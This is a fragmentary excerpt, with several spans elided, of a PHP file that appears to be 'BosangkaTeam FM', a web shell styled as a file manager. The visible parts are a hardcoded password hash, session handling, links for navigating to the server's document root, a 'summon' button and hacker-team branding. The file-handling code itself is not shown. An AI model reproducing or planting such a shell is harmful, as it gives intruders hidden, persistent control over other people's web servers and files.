...
session_start();
define('APP_VER', '0.8');
$password = defined('PW') ? PW : '50e0c7d8ad19848483484552314e38de';
...
<header class="container mx-auto flex items-center justify-between p-4">
    <a href="?path=<?=urlencode($self_dir)?>" class="flex items-center">
        <h1 class="text-xl sm:text-2xl lg:text-3xl font-bold">BosangkaTeam FM</h1>
    </a>
    <a href="?path=<?=urlencode($docroot)?>" class="flex items-center">
        <img alt="Logo App" class="h-8 md:h-12" src="//s12.gifyu.com/images/b9aNn.gif"/>
    </a>
</header>
<div class="container mx-auto flex space-x-2 mb-4">
    ...
    <div class="flex">
        ...
        <button id="summon-btn" class="bg-gray-200 text-gray-800 px-3 py-1 border border-gray-300 border-l-0 rounded-r">🖊️</button>
    </div>
...
<footer class="container mx-auto p-4">
      <div class="flex flex-col sm:flex-row justify-between items-center pt-4 border-t border-gray-300">
        <div class="flex-grow lg:w-1/2 text-gray-600">
              <p class="text-gray-700"></p>Copyleft <?=date('Y');?> @bosangkateam</p>
        </div>
